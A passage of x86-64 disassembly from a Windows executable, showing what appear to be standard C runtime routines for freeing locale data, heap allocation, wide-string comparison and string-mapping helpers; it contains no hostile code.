   14000a2e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a2e9:	57                   	push   %rdi
   14000a2ea:	48 83 ec 20          	sub    $0x20,%rsp
   14000a2ee:	33 db                	xor    %ebx,%ebx
   14000a2f0:	48 8d 3d 79 4e 01 00 	lea    0x14e79(%rip),%rdi        # 0x14001f170
   14000a2f7:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   14000a2fb:	48 85 c9             	test   %rcx,%rcx
   14000a2fe:	74 0a                	je     0x14000a30a
   14000a300:	e8 07 fb ff ff       	call   0x140009e0c
   14000a305:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   14000a30a:	48 83 c3 08          	add    $0x8,%rbx
   14000a30e:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   14000a315:	72 d9                	jb     0x14000a2f0
   14000a317:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a31c:	b0 01                	mov    $0x1,%al
   14000a31e:	48 83 c4 20          	add    $0x20,%rsp
   14000a322:	5f                   	pop    %rdi
   14000a323:	c3                   	ret
   14000a324:	48 85 c9             	test   %rcx,%rcx
   14000a327:	0f 84 00 01 00 00    	je     0x14000a42d
   14000a32d:	53                   	push   %rbx
   14000a32e:	48 83 ec 20          	sub    $0x20,%rsp
   14000a332:	48 8b d9             	mov    %rcx,%rbx
   14000a335:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   14000a339:	48 3b 0d 38 44 01 00 	cmp    0x14438(%rip),%rcx        # 0x14001e778
   14000a340:	74 05                	je     0x14000a347
   14000a342:	e8 c9 dc ff ff       	call   0x140008010
   14000a347:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   14000a34b:	48 3b 0d 2e 44 01 00 	cmp    0x1442e(%rip),%rcx        # 0x14001e780
   14000a352:	74 05                	je     0x14000a359
   14000a354:	e8 b7 dc ff ff       	call   0x140008010
   14000a359:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000a35d:	48 3b 0d 24 44 01 00 	cmp    0x14424(%rip),%rcx        # 0x14001e788
   14000a364:	74 05                	je     0x14000a36b
   14000a366:	e8 a5 dc ff ff       	call   0x140008010
   14000a36b:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000a36f:	48 3b 0d 1a 44 01 00 	cmp    0x1441a(%rip),%rcx        # 0x14001e790
   14000a376:	74 05                	je     0x14000a37d
   14000a378:	e8 93 dc ff ff       	call   0x140008010
   14000a37d:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   14000a381:	48 3b 0d 10 44 01 00 	cmp    0x14410(%rip),%rcx        # 0x14001e798
   14000a388:	74 05                	je     0x14000a38f
   14000a38a:	e8 81 dc ff ff       	call   0x140008010
   14000a38f:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   14000a393:	48 3b 0d 06 44 01 00 	cmp    0x14406(%rip),%rcx        # 0x14001e7a0
   14000a39a:	74 05                	je     0x14000a3a1
   14000a39c:	e8 6f dc ff ff       	call   0x140008010
   14000a3a1:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   14000a3a5:	48 3b 0d fc 43 01 00 	cmp    0x143fc(%rip),%rcx        # 0x14001e7a8
   14000a3ac:	74 05                	je     0x14000a3b3
   14000a3ae:	e8 5d dc ff ff       	call   0x140008010
   14000a3b3:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   14000a3b7:	48 3b 0d 0a 44 01 00 	cmp    0x1440a(%rip),%rcx        # 0x14001e7c8
   14000a3be:	74 05                	je     0x14000a3c5
   14000a3c0:	e8 4b dc ff ff       	call   0x140008010
   14000a3c5:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   14000a3c9:	48 3b 0d 00 44 01 00 	cmp    0x14400(%rip),%rcx        # 0x14001e7d0
   14000a3d0:	74 05                	je     0x14000a3d7
   14000a3d2:	e8 39 dc ff ff       	call   0x140008010
   14000a3d7:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   14000a3db:	48 3b 0d f6 43 01 00 	cmp    0x143f6(%rip),%rcx        # 0x14001e7d8
   14000a3e2:	74 05                	je     0x14000a3e9
   14000a3e4:	e8 27 dc ff ff       	call   0x140008010
   14000a3e9:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000a3f0:	48 3b 0d e9 43 01 00 	cmp    0x143e9(%rip),%rcx        # 0x14001e7e0
   14000a3f7:	74 05                	je     0x14000a3fe
   14000a3f9:	e8 12 dc ff ff       	call   0x140008010
   14000a3fe:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   14000a405:	48 3b 0d dc 43 01 00 	cmp    0x143dc(%rip),%rcx        # 0x14001e7e8
   14000a40c:	74 05                	je     0x14000a413
   14000a40e:	e8 fd db ff ff       	call   0x140008010
   14000a413:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   14000a41a:	48 3b 0d cf 43 01 00 	cmp    0x143cf(%rip),%rcx        # 0x14001e7f0
   14000a421:	74 05                	je     0x14000a428
   14000a423:	e8 e8 db ff ff       	call   0x140008010
   14000a428:	48 83 c4 20          	add    $0x20,%rsp
   14000a42c:	5b                   	pop    %rbx
   14000a42d:	c3                   	ret
   14000a42e:	cc                   	int3
   14000a42f:	cc                   	int3
   14000a430:	48 85 c9             	test   %rcx,%rcx
   14000a433:	74 66                	je     0x14000a49b
   14000a435:	53                   	push   %rbx
   14000a436:	48 83 ec 20          	sub    $0x20,%rsp
   14000a43a:	48 8b d9             	mov    %rcx,%rbx
   14000a43d:	48 8b 09             	mov    (%rcx),%rcx
   14000a440:	48 3b 0d 19 43 01 00 	cmp    0x14319(%rip),%rcx        # 0x14001e760
   14000a447:	74 05                	je     0x14000a44e
   14000a449:	e8 c2 db ff ff       	call   0x140008010
   14000a44e:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000a452:	48 3b 0d 0f 43 01 00 	cmp    0x1430f(%rip),%rcx        # 0x14001e768
   14000a459:	74 05                	je     0x14000a460
   14000a45b:	e8 b0 db ff ff       	call   0x140008010
   14000a460:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   14000a464:	48 3b 0d 05 43 01 00 	cmp    0x14305(%rip),%rcx        # 0x14001e770
   14000a46b:	74 05                	je     0x14000a472
   14000a46d:	e8 9e db ff ff       	call   0x140008010
   14000a472:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   14000a476:	48 3b 0d 3b 43 01 00 	cmp    0x1433b(%rip),%rcx        # 0x14001e7b8
   14000a47d:	74 05                	je     0x14000a484
   14000a47f:	e8 8c db ff ff       	call   0x140008010
   14000a484:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   14000a488:	48 3b 0d 31 43 01 00 	cmp    0x14331(%rip),%rcx        # 0x14001e7c0
   14000a48f:	74 05                	je     0x14000a496
   14000a491:	e8 7a db ff ff       	call   0x140008010
   14000a496:	48 83 c4 20          	add    $0x20,%rsp
   14000a49a:	5b                   	pop    %rbx
   14000a49b:	c3                   	ret
   14000a49c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a4a1:	57                   	push   %rdi
   14000a4a2:	48 83 ec 20          	sub    $0x20,%rsp
   14000a4a6:	48 8d 3c d1          	lea    (%rcx,%rdx,8),%rdi
   14000a4aa:	48 8b d9             	mov    %rcx,%rbx
   14000a4ad:	48 3b cf             	cmp    %rdi,%rcx
   14000a4b0:	74 11                	je     0x14000a4c3
   14000a4b2:	48 8b 0b             	mov    (%rbx),%rcx
   14000a4b5:	e8 56 db ff ff       	call   0x140008010
   14000a4ba:	48 83 c3 08          	add    $0x8,%rbx
   14000a4be:	48 3b df             	cmp    %rdi,%rbx
   14000a4c1:	75 ef                	jne    0x14000a4b2
   14000a4c3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a4c8:	48 83 c4 20          	add    $0x20,%rsp
   14000a4cc:	5f                   	pop    %rdi
   14000a4cd:	c3                   	ret
   14000a4ce:	cc                   	int3
   14000a4cf:	cc                   	int3
   14000a4d0:	48 85 c9             	test   %rcx,%rcx
   14000a4d3:	0f 84 fe 00 00 00    	je     0x14000a5d7
   14000a4d9:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a4de:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a4e3:	56                   	push   %rsi
   14000a4e4:	48 83 ec 20          	sub    $0x20,%rsp
   14000a4e8:	bd 07 00 00 00       	mov    $0x7,%ebp
   14000a4ed:	48 8b d9             	mov    %rcx,%rbx
   14000a4f0:	8b d5                	mov    %ebp,%edx
   14000a4f2:	e8 a5 ff ff ff       	call   0x14000a49c
   14000a4f7:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   14000a4fb:	8b d5                	mov    %ebp,%edx
   14000a4fd:	e8 9a ff ff ff       	call   0x14000a49c
   14000a502:	8d 75 05             	lea    0x5(%rbp),%esi
   14000a505:	8b d6                	mov    %esi,%edx
   14000a507:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   14000a50b:	e8 8c ff ff ff       	call   0x14000a49c
   14000a510:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   14000a517:	8b d6                	mov    %esi,%edx
   14000a519:	e8 7e ff ff ff       	call   0x14000a49c
   14000a51e:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   14000a525:	8d 55 fb             	lea    -0x5(%rbp),%edx
   14000a528:	e8 6f ff ff ff       	call   0x14000a49c
   14000a52d:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   14000a534:	e8 d7 da ff ff       	call   0x140008010
   14000a539:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   14000a540:	e8 cb da ff ff       	call   0x140008010
   14000a545:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   14000a54c:	e8 bf da ff ff       	call   0x140008010
   14000a551:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   14000a558:	8b d5                	mov    %ebp,%edx
   14000a55a:	e8 3d ff ff ff       	call   0x14000a49c
   14000a55f:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   14000a566:	8b d5                	mov    %ebp,%edx
   14000a568:	e8 2f ff ff ff       	call   0x14000a49c
   14000a56d:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   14000a574:	8b d6                	mov    %esi,%edx
   14000a576:	e8 21 ff ff ff       	call   0x14000a49c
   14000a57b:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   14000a582:	8b d6                	mov    %esi,%edx
   14000a584:	e8 13 ff ff ff       	call   0x14000a49c
   14000a589:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   14000a590:	8d 55 fb             	lea    -0x5(%rbp),%edx
   14000a593:	e8 04 ff ff ff       	call   0x14000a49c
   14000a598:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   14000a59f:	e8 6c da ff ff       	call   0x140008010
   14000a5a4:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   14000a5ab:	e8 60 da ff ff       	call   0x140008010
   14000a5b0:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   14000a5b7:	e8 54 da ff ff       	call   0x140008010
   14000a5bc:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   14000a5c3:	e8 48 da ff ff       	call   0x140008010
   14000a5c8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a5cd:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000a5d2:	48 83 c4 20          	add    $0x20,%rsp
   14000a5d6:	5e                   	pop    %rsi
   14000a5d7:	c3                   	ret
   14000a5d8:	cc                   	int3
   14000a5d9:	cc                   	int3
   14000a5da:	cc                   	int3
   14000a5db:	cc                   	int3
   14000a5dc:	cc                   	int3
   14000a5dd:	cc                   	int3
   14000a5de:	cc                   	int3
   14000a5df:	cc                   	int3
   14000a5e0:	40 53                	rex push %rbx
   14000a5e2:	48 83 ec 20          	sub    $0x20,%rsp
   14000a5e6:	48 8b d9             	mov    %rcx,%rbx
   14000a5e9:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   14000a5ed:	77 3c                	ja     0x14000a62b
   14000a5ef:	48 85 c9             	test   %rcx,%rcx
   14000a5f2:	b8 01 00 00 00       	mov    $0x1,%eax
   14000a5f7:	48 0f 44 d8          	cmove  %rax,%rbx
   14000a5fb:	eb 15                	jmp    0x14000a612
   14000a5fd:	e8 6e c6 ff ff       	call   0x140006c70
   14000a602:	85 c0                	test   %eax,%eax
   14000a604:	74 25                	je     0x14000a62b
   14000a606:	48 8b cb             	mov    %rbx,%rcx
   14000a609:	e8 82 0c 00 00       	call   0x14000b290
   14000a60e:	85 c0                	test   %eax,%eax
   14000a610:	74 19                	je     0x14000a62b
   14000a612:	48 8b 0d 27 50 01 00 	mov    0x15027(%rip),%rcx        # 0x14001f640
   14000a619:	4c 8b c3             	mov    %rbx,%r8
   14000a61c:	33 d2                	xor    %edx,%edx
   14000a61e:	ff 15 4c 5b 00 00    	call   *0x5b4c(%rip)        # 0x140010170
   14000a624:	48 85 c0             	test   %rax,%rax
   14000a627:	74 d4                	je     0x14000a5fd
   14000a629:	eb 0d                	jmp    0x14000a638
   14000a62b:	e8 3c d9 ff ff       	call   0x140007f6c
   14000a630:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000a636:	33 c0                	xor    %eax,%eax
   14000a638:	48 83 c4 20          	add    $0x20,%rsp
   14000a63c:	5b                   	pop    %rbx
   14000a63d:	c3                   	ret
   14000a63e:	cc                   	int3
   14000a63f:	cc                   	int3
   14000a640:	4d 85 c0             	test   %r8,%r8
   14000a643:	75 03                	jne    0x14000a648
   14000a645:	33 c0                	xor    %eax,%eax
   14000a647:	c3                   	ret
   14000a648:	49 83 e8 01          	sub    $0x1,%r8
   14000a64c:	74 1d                	je     0x14000a66b
   14000a64e:	66 90                	xchg   %ax,%ax
   14000a650:	0f b7 01             	movzwl (%rcx),%eax
   14000a653:	66 85 c0             	test   %ax,%ax
   14000a656:	74 13                	je     0x14000a66b
   14000a658:	66 3b 02             	cmp    (%rdx),%ax
   14000a65b:	75 0e                	jne    0x14000a66b
   14000a65d:	48 83 c1 02          	add    $0x2,%rcx
   14000a661:	48 83 c2 02          	add    $0x2,%rdx
   14000a665:	49 83 e8 01          	sub    $0x1,%r8
   14000a669:	75 e5                	jne    0x14000a650
   14000a66b:	0f b7 01             	movzwl (%rcx),%eax
   14000a66e:	0f b7 0a             	movzwl (%rdx),%ecx
   14000a671:	2b c1                	sub    %ecx,%eax
   14000a673:	c3                   	ret
   14000a674:	40 55                	rex push %rbp
   14000a676:	41 54                	push   %r12
   14000a678:	41 55                	push   %r13
   14000a67a:	41 56                	push   %r14
   14000a67c:	41 57                	push   %r15
   14000a67e:	48 83 ec 60          	sub    $0x60,%rsp
   14000a682:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000a687:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   14000a68b:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   14000a68f:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   14000a693:	48 8b 05 66 39 01 00 	mov    0x13966(%rip),%rax        # 0x14001e000
   14000a69a:	48 33 c5             	xor    %rbp,%rax
   14000a69d:	48 89 45 28          	mov    %rax,0x28(%rbp)
   14000a6a1:	44 8b ea             	mov    %edx,%r13d
   14000a6a4:	45 8b f9             	mov    %r9d,%r15d
   14000a6a7:	48 8b d1             	mov    %rcx,%rdx
   14000a6aa:	4d 8b e0             	mov    %r8,%r12
   14000a6ad:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   14000a6b1:	e8 32 e4 ff ff       	call   0x140008ae8
   14000a6b6:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   14000a6bc:	85 ff                	test   %edi,%edi
   14000a6be:	75 07                	jne    0x14000a6c7
   14000a6c0:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a6c4:	8b 78 0c             	mov    0xc(%rax),%edi
   14000a6c7:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   14000a6cd:	45 8b cf             	mov    %r15d,%r9d
   14000a6d0:	4d 8b c4             	mov    %r12,%r8
   14000a6d3:	8b cf                	mov    %edi,%ecx
   14000a6d5:	1b d2                	sbb    %edx,%edx
   14000a6d7:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000a6dc:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a6e2:	83 e2 08             	and    $0x8,%edx
   14000a6e5:	ff c2                	inc    %edx
   14000a6e7:	e8 dc f2 ff ff       	call   0x1400099c8
   14000a6ec:	4c 63 f0             	movslq %eax,%r14
   14000a6ef:	85 c0                	test   %eax,%eax
   14000a6f1:	75 07                	jne    0x14000a6fa
   14000a6f3:	33 ff                	xor    %edi,%edi
   14000a6f5:	e9 d0 00 00 00       	jmp    0x14000a7ca
   14000a6fa:	49 8b f6             	mov    %r14,%rsi
   14000a6fd:	48 03 f6             	add    %rsi,%rsi
   14000a700:	48 8d 46 10          	lea    0x10(%rsi),%rax
   14000a704:	48 3b f0             	cmp    %rax,%rsi
   14000a707:	48 1b c9             	sbb    %rcx,%rcx
   14000a70a:	48 23 c8             	and    %rax,%rcx
   14000a70d:	0f 84 9d 00 00 00    	je     0x14000a7b0
   14000a713:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   14000a71a:	77 31                	ja     0x14000a74d
   14000a71c:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000a720:	48 3b c1             	cmp    %rcx,%rax
   14000a723:	77 0a                	ja     0x14000a72f
   14000a725:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000a72c:	ff ff 0f 
   14000a72f:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000a733:	e8 d8 41 00 00       	call   0x14000e910
   14000a738:	48 2b e0             	sub    %rax,%rsp
   14000a73b:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   14000a740:	48 85 db             	test   %rbx,%rbx
   14000a743:	74 6d                	je     0x14000a7b2
   14000a745:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000a74b:	eb 13                	jmp    0x14000a760
   14000a74d:	e8 8e fe ff ff       	call   0x14000a5e0
   14000a752:	48 8b d8             	mov    %rax,%rbx
   14000a755:	48 85 c0             	test   %rax,%rax
   14000a758:	74 0a                	je     0x14000a764
   14000a75a:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000a760:	48 83 c3 10          	add    $0x10,%rbx
   14000a764:	48 85 db             	test   %rbx,%rbx
   14000a767:	74 49                	je     0x14000a7b2
   14000a769:	4c 8b c6             	mov    %rsi,%r8
   14000a76c:	33 d2                	xor    %edx,%edx
   14000a76e:	48 8b cb             	mov    %rbx,%rcx
   14000a771:	e8 8a 49 00 00       	call   0x14000f100
   14000a776:	45 8b cf             	mov    %r15d,%r9d
   14000a779:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   14000a77e:	4d 8b c4             	mov    %r12,%r8
   14000a781:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000a786:	ba 01 00 00 00       	mov    $0x1,%edx
   14000a78b:	8b cf                	mov    %edi,%ecx
   14000a78d:	e8 36 f2 ff ff       	call   0x1400099c8
   14000a792:	85 c0                	test   %eax,%eax
   14000a794:	74 1c                	je     0x14000a7b2
   14000a796:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   14000a79d:	44 8b c0             	mov    %eax,%r8d
   14000a7a0:	48 8b d3             	mov    %rbx,%rdx
   14000a7a3:	41 8b cd             	mov    %r13d,%ecx
   14000a7a6:	ff 15 4c 5a 00 00    	call   *0x5a4c(%rip)        # 0x1400101f8
   14000a7ac:	8b f8                	mov    %eax,%edi
   14000a7ae:	eb 09                	jmp    0x14000a7b9
   14000a7b0:	33 db                	xor    %ebx,%ebx
   14000a7b2:	33 ff                	xor    %edi,%edi
   14000a7b4:	48 85 db             	test   %rbx,%rbx
   14000a7b7:	74 11                	je     0x14000a7ca
   14000a7b9:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000a7bd:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a7c3:	75 05                	jne    0x14000a7ca
   14000a7c5:	e8 46 d8 ff ff       	call   0x140008010
   14000a7ca:	80 7d 20 00          	cmpb   $0x0,0x20(%rbp)
   14000a7ce:	74 0b                	je     0x14000a7db
   14000a7d0:	48 8b 45 08          	mov    0x8(%rbp),%rax
   14000a7d4:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a7db:	8b c7                	mov    %edi,%eax
   14000a7dd:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000a7e1:	48 33 cd             	xor    %rbp,%rcx
   14000a7e4:	e8 27 89 ff ff       	call   0x140003110
   14000a7e9:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   14000a7ed:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   14000a7f1:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   14000a7f5:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   14000a7f9:	41 5f                	pop    %r15
   14000a7fb:	41 5e                	pop    %r14
   14000a7fd:	41 5d                	pop    %r13
   14000a7ff:	41 5c                	pop    %r12
   14000a801:	5d                   	pop    %rbp
   14000a802:	c3                   	ret
   14000a803:	cc                   	int3
   14000a804:	f0 ff 41 10          	lock incl 0x10(%rcx)
   14000a808:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   14000a80f:	48 85 c0             	test   %rax,%rax
   14000a812:	74 03                	je     0x14000a817
   14000a814:	f0 ff 00             	lock incl (%rax)
   14000a817:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   14000a81e:	48 85 c0             	test   %rax,%rax
   14000a821:	74 03                	je     0x14000a826
   14000a823:	f0 ff 00             	lock incl (%rax)
   14000a826:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   14000a82d:	48 85 c0             	test   %rax,%rax
   14000a830:	74 03                	je     0x14000a835
   14000a832:	f0 ff 00             	lock incl (%rax)
   14000a835:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   14000a83c:	48 85 c0             	test   %rax,%rax
   14000a83f:	74 03                	je     0x14000a844
   14000a841:	f0 ff 00             	lock incl (%rax)
   14000a844:	48 8d 41 38          	lea    0x38(%rcx),%rax
   14000a848:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   14000a84e:	48 8d 15 03 3f 01 00 	lea    0x13f03(%rip),%rdx        # 0x14001e758
   14000a855:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   14000a859:	74 0b                	je     0x14000a866
   14000a85b:	48 8b 10             	mov    (%rax),%rdx
   14000a85e:	48 85 d2             	test   %rdx,%rdx
   14000a861:	74 03                	je     0x14000a866
   14000a863:	f0 ff 02             	lock incl (%rdx)
   14000a866:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   14000a86b:	74 0c                	je     0x14000a879
   14000a86d:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   14000a871:	48 85 d2             	test   %rdx,%rdx
   14000a874:	74 03                	je     0x14000a879
   14000a876:	f0 ff 02             	lock incl (%rdx)
   14000a879:	48 83 c0 20          	add    $0x20,%rax
   14000a87d:	49 83 e8 01          	sub    $0x1,%r8
   14000a881:	75 cb                	jne    0x14000a84e
   14000a883:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   14000a88a:	e9 79 01 00 00       	jmp    0x14000aa08
   14000a88f:	cc                   	int3
   14000a890:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a895:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a89a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a89f:	57                   	push   %rdi
   14000a8a0:	48 83 ec 20          	sub    $0x20,%rsp
   14000a8a4:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   14000a8ab:	48 8b d9             	mov    %rcx,%rbx
   14000a8ae:	48 85 c0             	test   %rax,%rax
   14000a8b1:	74 79                	je     0x14000a92c
   14000a8b3:	48 8d 0d a6 3e 01 00 	lea    0x13ea6(%rip),%rcx        # 0x14001e760
   14000a8ba:	48 3b c1             	cmp    %rcx,%rax
   14000a8bd:	74 6d                	je     0x14000a92c
   14000a8bf:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   14000a8c6:	48 85 c0             	test   %rax,%rax
   14000a8c9:	74 61                	je     0x14000a92c
   14000a8cb:	83 38 00             	cmpl   $0x0,(%rax)
   14000a8ce:	75 5c                	jne    0x14000a92c
   14000a8d0:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   14000a8d7:	48 85 c9             	test   %rcx,%rcx
   14000a8da:	74 16                	je     0x14000a8f2
   14000a8dc:	83 39 00             	cmpl   $0x0,(%rcx)
   14000a8df:	75 11                	jne    0x14000a8f2
   14000a8e1:	e8 2a d7 ff ff       	call   0x140008010
   14000a8e6:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000a8ed:	e8 32 fa ff ff       	call   0x14000a324
   14000a8f2:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   14000a8f9:	48 85 c9             	test   %rcx,%rcx
   14000a8fc:	74 16                	je     0x14000a914
   14000a8fe:	83 39 00             	cmpl   $0x0,(%rcx)
   14000a901:	75 11                	jne    0x14000a914
   14000a903:	e8 08 d7 ff ff       	call   0x140008010
   14000a908:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000a90f:	e8 1c fb ff ff       	call   0x14000a430
   14000a914:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   14000a91b:	e8 f0 d6 ff ff       	call   0x140008010
   14000a920:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000a927:	e8 e4 d6 ff ff       	call   0x140008010
   14000a92c:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   14000a933:	48 85 c0             	test   %rax,%rax
   14000a936:	74 47                	je     0x14000a97f
   14000a938:	83 38 00             	cmpl   $0x0,(%rax)
   14000a93b:	75 42                	jne    0x14000a97f
   14000a93d:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   14000a944:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   14000a94b:	e8 c0 d6 ff ff       	call   0x140008010
   14000a950:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   14000a957:	bf 80 00 00 00       	mov    $0x80,%edi
   14000a95c:	48 2b cf             	sub    %rdi,%rcx
   14000a95f:	e8 ac d6 ff ff       	call   0x140008010
   14000a964:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   14000a96b:	48 2b cf             	sub    %rdi,%rcx
   14000a96e:	e8 9d d6 ff ff       	call   0x140008010
   14000a973:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   14000a97a:	e8 91 d6 ff ff       	call   0x140008010
   14000a97f:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   14000a986:	e8 a5 00 00 00       	call   0x14000aa30
   14000a98b:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   14000a992:	bd 06 00 00 00       	mov    $0x6,%ebp
   14000a997:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   14000a99b:	48 8d 05 b6 3d 01 00 	lea    0x13db6(%rip),%rax        # 0x14001e758
   14000a9a2:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   14000a9a6:	74 1a                	je     0x14000a9c2
   14000a9a8:	48 8b 0f             	mov    (%rdi),%rcx
   14000a9ab:	48 85 c9             	test   %rcx,%rcx
   14000a9ae:	74 12                	je     0x14000a9c2
   14000a9b0:	83 39 00             	cmpl   $0x0,(%rcx)
   14000a9b3:	75 0d                	jne    0x14000a9c2
   14000a9b5:	e8 56 d6 ff ff       	call   0x140008010
   14000a9ba:	48 8b 0e             	mov    (%rsi),%rcx
   14000a9bd:	e8 4e d6 ff ff       	call   0x140008010
   14000a9c2:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   14000a9c7:	74 13                	je     0x14000a9dc
   14000a9c9:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   14000a9cd:	48 85 c9             	test   %rcx,%rcx
   14000a9d0:	74 0a                	je     0x14000a9dc
   14000a9d2:	83 39 00             	cmpl   $0x0,(%rcx)
   14000a9d5:	75 05                	jne    0x14000a9dc
   14000a9d7:	e8 34 d6 ff ff       	call   0x140008010
   14000a9dc:	48 83 c6 08          	add    $0x8,%rsi
   14000a9e0:	48 83 c7 20          	add    $0x20,%rdi
   14000a9e4:	48 83 ed 01          	sub    $0x1,%rbp
   14000a9e8:	75 b1                	jne    0x14000a99b
   14000a9ea:	48 8b cb             	mov    %rbx,%rcx
   14000a9ed:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a9f2:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000a9f7:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000a9fc:	48 83 c4 20          	add    $0x20,%rsp
   14000aa00:	5f                   	pop    %rdi
   14000aa01:	e9 0a d6 ff ff       	jmp    0x140008010
   14000aa06:	cc                   	int3
   14000aa07:	cc                   	int3
   14000aa08:	48 85 c9             	test   %rcx,%rcx
   14000aa0b:	74 1c                	je     0x14000aa29
